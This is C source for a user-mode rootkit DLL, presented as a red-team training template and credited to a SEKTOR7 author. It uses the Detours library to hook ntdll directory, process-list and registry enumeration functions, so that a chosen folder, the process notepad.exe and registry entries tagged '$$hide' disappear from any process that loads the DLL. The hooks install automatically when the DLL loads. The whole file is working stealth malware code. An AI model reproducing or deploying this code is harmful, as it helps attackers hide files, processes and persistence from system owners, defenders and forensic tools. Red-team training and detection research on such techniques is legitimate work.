/*
 
 Red Team Operator code template
 Hiding artifacts with hooking DLL and Detours lib

 author: reenz0h (twitter: @SEKTOR7net)
 inspiration: r77 rootkit (by Martin Fischer)
 
*/

#include <stdio.h>
#include <windows.h>
#include <shlwapi.h>
#include <winternl.h>
#include "detours.h"
#include "nt.h"

#pragma comment(lib, "shlwapi.lib")

#define HIDE_PATH L"c:\\rto\\hide"
#define HIDE_PROCNAME L"notepad.exe"
#define HIDE_REG L"$$hide"


// pointers to Nt* functions
NtQueryDirectoryFile_t		origNtQueryDirectoryFile = NULL;
NtQueryDirectoryFileEx_t	origNtQueryDirectoryFileEx = NULL;
NtQuerySystemInformation_t	origNtQuerySystemInformation = NULL;
NtEnumerateKey_t			origNtEnumerateKey = NULL;
NtEnumerateValueKey_t		origNtEnumerateValueKey = NULL;

BOOL Hookem(void);
BOOL UnHookem(void);


// Hooking functions
NTSTATUS NTAPI HookedNtQueryDirectoryFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, LPVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, LPVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileName, BOOLEAN RestartScan) {
	
	NTSTATUS status = STATUS_NO_MORE_FILES;
	WCHAR dirPath[MAX_PATH + 1] = { 0 };
	
	// check if we're checking our hidden directory
	if (GetFinalPathNameByHandleW(FileHandle, dirPath, MAX_PATH, FILE_NAME_NORMALIZED)) {

		// if so, return empty structure
		if (StrStrIW(dirPath, HIDE_PATH))
			ZeroMemory(FileInformation, Length);
		else
			// otherwise - proceed with normal call
			status = origNtQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);
	}
	
	return status;
}


NTSTATUS NTAPI HookedNtQueryDirectoryFileEx(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine,PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, ULONG QueryFlags, PUNICODE_STRING FileName) {

	NTSTATUS status = STATUS_NO_MORE_FILES;
	WCHAR dirPath[MAX_PATH + 1] = { 0 };

	// check if we're checking our hidden directory	
	if (GetFinalPathNameByHandleW(FileHandle, dirPath, MAX_PATH, FILE_NAME_NORMALIZED)) {

		// if so, return empty structure
		if (StrStrIW(dirPath, HIDE_PATH))
			ZeroMemory(FileInformation, Length);
		else
			// otherwise - proceed with normal call
			status = origNtQueryDirectoryFileEx(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, QueryFlags, FileName);
	}	
	return status;
}


NTSTATUS NTAPI HookedNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength) {
	
	// call the original function to retrieve the information data
	NTSTATUS status = origNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

	// check if the caller wants to see process information data
	if (SystemInformationClass == SystemProcessInformation) {

		// if so, parse the output
		SYSTEM_PROCESS_INFORMATION * cur = (SYSTEM_PROCESS_INFORMATION *) SystemInformation;
		SYSTEM_PROCESS_INFORMATION * prev = NULL;
		
		while (cur) {
			// if the current record in the array is pointing to our hidden process...
			if (StrStrIW(cur->ImageName.Buffer, HIDE_PROCNAME)) {
				// ... and is the first record in the array
				if (!prev) {
					// skip the first record
					if (cur->NextEntryOffset) SystemInformation = (LPBYTE) SystemInformation + cur->NextEntryOffset;
					// ... unless there's nothing more left in the array
					else { 
						SystemInformation = NULL;
						break;   // exit the loop
					}
				}
				// ... otherwise, fix the previous record to point to the next one from the current
				else {
					if (cur->NextEntryOffset) prev->NextEntryOffset += cur->NextEntryOffset;
					else 
						// ... unless there's no any
						prev->NextEntryOffset = 0;
				}
			}
			// otherwise, save the pointer to current record...
			else prev = cur;
			
			// ... and move to the next record, if exists
			if (cur->NextEntryOffset) cur = (SYSTEM_PROCESS_INFORMATION *) ((LPBYTE) cur + cur->NextEntryOffset);
			else break; // if not, exit the loop
		}
		
	}
	
	return status;
}


NTSTATUS NTAPI HookedNtEnumerateKey(HANDLE KeyHandle, ULONG Index, KEY_INFORMATION_CLASS KeyInformationClass, PVOID KeyInformation, ULONG Length, PULONG ResultLength) {

	NTSTATUS status = origNtEnumerateKey(KeyHandle, Index, KeyInformationClass, KeyInformation, Length, ResultLength);
	WCHAR * keyName = NULL;
	
	// get name of the key, depending on the type of information returned
	if (KeyInformationClass == KeyBasicInformation) keyName = ((KEY_BASIC_INFORMATION *) KeyInformation)->Name;
	if (KeyInformationClass == KeyNameInformation) keyName = ((KEY_NAME_INFORMATION *) KeyInformation)->Name;

	// check if the it matches the hidden key
	if (StrStrIW(keyName, HIDE_REG)) {
		ZeroMemory(KeyInformation, Length);
		status = STATUS_NO_MORE_ENTRIES;
	}
	
	return status;
};


NTSTATUS NTAPI HookedNtEnumerateValueKey(HANDLE KeyHandle, ULONG Index, KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass, PVOID KeyValueInformation, ULONG Length, PULONG ResultLength) {
	
	NTSTATUS status = origNtEnumerateValueKey(KeyHandle, Index, KeyValueInformationClass, KeyValueInformation, Length, ResultLength);
	WCHAR * keyValueName = NULL;

	// get name of the key, depending on the type of information returned
	if (KeyValueInformationClass == KeyValueBasicInformation) keyValueName = ((KEY_VALUE_BASIC_INFORMATION *) KeyValueInformation)->Name;
	if (KeyValueInformationClass == KeyValueFullInformation) keyValueName = ((KEY_VALUE_FULL_INFORMATION *) KeyValueInformation)->Name;

	// check if the it matches the hidden key
	if (StrStrIW(keyValueName, HIDE_REG)) {
		ZeroMemory(KeyValueInformation, Length);
		status = STATUS_NO_MORE_ENTRIES;
	}	
	
	return status;
};


// Set hooks on Nt* functions
BOOL Hookem(void) {

    LONG err;

	// resolve the addresses of original Nt* functions
	origNtQueryDirectoryFile		= (NtQueryDirectoryFile_t) GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQueryDirectoryFile");
	origNtQueryDirectoryFileEx		= (NtQueryDirectoryFileEx_t) GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQueryDirectoryFileEx");
	origNtQuerySystemInformation 	= (NtQuerySystemInformation_t) GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQuerySystemInformation");
	origNtEnumerateKey				= (NtEnumerateKey_t) GetProcAddress(GetModuleHandle("ntdll.dll"), "NtEnumerateKey");
	origNtEnumerateValueKey			= (NtEnumerateValueKey_t) GetProcAddress(GetModuleHandle("ntdll.dll"), "NtEnumerateValueKey");

	DetourRestoreAfterWith();

	// set the hooks
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourAttach(&(PVOID&)origNtQueryDirectoryFile, HookedNtQueryDirectoryFile);
	DetourAttach(&(PVOID&)origNtQueryDirectoryFileEx, HookedNtQueryDirectoryFileEx);
	DetourAttach(&(PVOID&)origNtQuerySystemInformation, HookedNtQuerySystemInformation);
	DetourAttach(&(PVOID&)origNtEnumerateKey, HookedNtEnumerateKey);
	DetourAttach(&(PVOID&)origNtEnumerateValueKey, HookedNtEnumerateValueKey);
	err = DetourTransactionCommit();

	return TRUE;
}


// Revert all changes to original code
BOOL UnHookem(void) {
	
	LONG err;
	
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourDetach(&(PVOID&)origNtQueryDirectoryFile, HookedNtQueryDirectoryFile);
	DetourDetach(&(PVOID&)origNtQueryDirectoryFileEx, HookedNtQueryDirectoryFileEx);
	DetourDetach(&(PVOID&)origNtQuerySystemInformation, HookedNtQuerySystemInformation);
	DetourDetach(&(PVOID&)origNtEnumerateKey, HookedNtEnumerateKey);
	DetourDetach(&(PVOID&)origNtEnumerateValueKey, HookedNtEnumerateValueKey);
	err = DetourTransactionCommit();

	return TRUE;
}


BOOL WINAPI DllMain(HINSTANCE hinst, DWORD dwReason, LPVOID reserved) {

    if (DetourIsHelperProcess()) {
        return TRUE;
    }

    switch (dwReason)  {
		case DLL_PROCESS_ATTACH:
			Hookem();
			break;
			
		case DLL_THREAD_ATTACH:
			break;
			
		case DLL_THREAD_DETACH:
			break;
			
		case DLL_PROCESS_DETACH:
			UnHookem();
			break;
	}
	
    return TRUE;
}

